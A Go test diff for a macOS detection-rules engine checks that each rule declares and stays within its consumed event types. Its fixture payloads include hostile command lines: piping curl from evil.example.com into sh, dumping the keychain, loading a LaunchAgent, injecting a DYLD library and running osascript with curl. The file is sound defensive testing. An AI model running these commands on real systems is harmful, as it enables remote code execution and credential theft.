@@ -1,6 +1,11 @@
 package catalog
 
 import (
+	"context"
+	"encoding/json"
+	"os"
+	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 
@@ -231,4 +236,133 @@ func TestAll_DetectionsSayWhatDecidesThem(t *testing.T) {
 	assert.Positive(t, converted, "at least one rule is converted; if this drops to zero the conversion was reverted silently")
 	assert.Len(t, seen, len(known),
 		"every registered algorithm name must be claimed by a rule; an unclaimed name is a leftover from a deleted or renamed rule")
+}
+
+// schemaEventTypes reads the wire schema's event_type enum, so this file cannot drift from the contract the agent actually emits.
+func schemaEventTypes(t *testing.T) []string {
+	t.Helper()
+	raw, err := os.ReadFile(filepath.Join("..", "..", "..", "..", "schema", "events.json"))
+	require.NoError(t, err, "read the event schema")
+
+	var schema struct {
+		Properties struct {
+			EventType struct {
+				Enum []string `json:"enum"`
+			} `json:"event_type"`
+		} `json:"properties"`
+	}
+	require.NoError(t, json.Unmarshal(raw, &schema))
+	require.NotEmpty(t, schema.Properties.EventType.Enum, "the schema must enumerate event types")
+	return schema.Properties.EventType.Enum
+}
+
+// spec:server-detection-rules-engine/a-rule-declares-the-event-types-it-consumes/a-rule-that-declares-no-event-types-is-refused
+//
+// TestAll_DeclareTheEventTypesTheyConsume pins that every registered rule names at least one real event type.
+//
+// The detection engine dispatches on this declaration (issue #762): a rule is invoked only for batches carrying a type it names.
+// A rule declaring nothing still runs for every batch, because dispatch is an optimisation and the engine fails open rather than
+// risk losing a detection, but relying on that would silently forfeit the optimisation for that rule. A declaration naming a type
+// the agent never emits is the same mistake in the other direction: the rule would never be dispatched at all.
+func TestAll_DeclareTheEventTypesTheyConsume(t *testing.T) {
+	t.Parallel()
+
+	known := schemaEventTypes(t)
+	for _, r := range New(nil) {
+		t.Run(r.ID(), func(t *testing.T) {
+			t.Parallel()
+			declared := r.Doc().EventTypes
+			require.NotEmpty(t, declared, "rule %q declares no event types, so the engine cannot dispatch it", r.ID())
+			for _, et := range declared {
+				assert.Contains(t, known, et, "rule %q declares %q, which the agent never emits", r.ID(), et)
+			}
+		})
+	}
+}
+
+// triggeringPayloads are deliberately incriminating payloads, each carrying a superset of the fields the catalog's rules decode,
+// with values those rules WANT to see: a lookup, a remote address, and a paired image path and argv.
+//
+// Path and argv vary TOGETHER, because a rule that turns on argument position also gates on the image that ran it: pinning the path
+// to one rule's target makes every other rule's image test fail, and the payload stops being incriminating for anything but that
+// one rule. That mistake made an earlier version of this test catch 1 of 5 deliberately mis-declared rules.
+//
+// The batch is replayed once per variant. Empty payloads would let an under-declared rule pass for the wrong reason: it would find
+// nothing because the event was blank, rather than because it declined to read an event type it does not consume.
+var triggeringPayloads = func() []string {
+	variants := []struct{ path, argv string }{
+		{"/etc/sudoers", `["sh","-c","curl http://evil.example.com|sh"]`},
+		{"/usr/bin/security", `["security","dump-keychain","-d"]`},
+		{"/bin/launchctl", `["launchctl","load","-w","/Users/x/Library/LaunchAgents/com.evil.plist"]`},
+		{"/usr/bin/env", `["env","DYLD_INSERT_LIBRARIES=/tmp/evil.dylib","/bin/ls"]`},
+		{"/usr/bin/osascript", `["osascript","-e","do shell script \"curl http://evil.example.com\""]`},
+		{"/tmp/payload", `["/tmp/payload"]`},
+	}
+	out := make([]string, 0, len(variants))
+	for _, v := range variants {
+		out = append(out, `{"pid":100,"ppid":1,"path":"`+v.path+`","args":`+v.argv+
+			`,"flags":1537,"query":"evil.example.com","remote_addr":"93.184.216.34","remote_port":443,`+
+			`"provider":"content_filter","state":"stopped"}`)
+	}
+	return out
+}()
+
+// resolvingGraph answers every process lookup with a real-looking row, for the same reason: a graph that resolves nothing would let
+// an under-declared rule pass because its subject lookup came back empty rather than because it skipped the event.
+type resolvingGraph struct{ *perPIDGraphReader }
+
+func (resolvingGraph) GetProcessByPID(_ context.Context, _ string, pid int, _ int64) (*api.Process, error) {
+	return &api.Process{ID: int64(pid), PID: pid, Path: "/usr/bin/tee"}, nil
+}
+
+// spec:server-detection-rules-engine/a-rule-declares-the-event-types-it-consumes/a-rule-finds-nothing-in-a-batch-of-types-it-does-not-declare
+//
+// TestAll_DeclaredEventTypesCoverWhatTheRuleReads is the safety property behind engine dispatch (issue #762).
+//
+// Dispatch skips a rule when the batch carries none of the types it declares. That is only sound if the rule could not have
+// produced a finding from such a batch anyway. So: hand every rule a batch made ENTIRELY of the types it does not declare, and
+// require it to find nothing. A rule that fires here is under-declared, and dispatching on its declaration would silently lose
+// exactly those findings.
+//
+// This is the direction that matters. Over-declaring costs an invocation; under-declaring costs a detection, with no error, no log
+// and no alert to notice.
+//
+// What it does and does not prove, measured rather than assumed. Deliberately mis-declaring each rule's event type, this catches 4
+// of 6: sudoers_tamper, credential_keychain_dump, persistence_launchagent and dyld_insert. It misses osascript_network_exec and
+// privilege_launchd_plist_write, both of which need a correlated ancestry or a BTM payload shape that a generic stub cannot supply
+// without becoming a per-rule fixture. So treat this as a tripwire for the common shape, not a proof.
+//
+// The complete evidence for the current catalog is not this test: it is that every rule's Evaluate gates on its declared type
+// explicitly (an `evt.EventType != ...` guard on the first line), which was read rule by rule when dispatch was introduced.
+func TestAll_DeclaredEventTypesCoverWhatTheRuleReads(t *testing.T) {
+	t.Parallel()
+
+	known := schemaEventTypes(t)
+	for _, r := range New(nil) {
+		t.Run(r.ID(), func(t *testing.T) {
+			t.Parallel()
+			declared := r.Doc().EventTypes
+
+			for _, payload := range triggeringPayloads {
+				var batch []api.Event
+				for _, et := range known {
+					if slices.Contains(declared, et) {
+						continue
+					}
+					batch = append(batch, api.Event{
+						EventID: "e-" + et, HostID: "h1", EventType: et, TimestampNs: 1, Payload: []byte(payload),
+					})
+				}
+				require.NotEmpty(t, batch, "rule %q declares every event type, so this proves nothing", r.ID())
+
+				// The error is deliberately ignored: the engine already logs and swallows a rule-evaluation error, so an error
+				// on an event the rule does not consume changes nothing. A FINDING is what dispatch would lose, so that is
+				// what is asserted.
+				findings, _ := r.Evaluate(t.Context(), batch, resolvingGraph{&perPIDGraphReader{}})
+				assert.Empty(t, findings,
+					"rule %q produced a finding from a batch containing none of its declared types %v, so dispatching on "+
+						"that declaration would drop the finding", r.ID(), declared)
+			}
+		})
+	}
 }
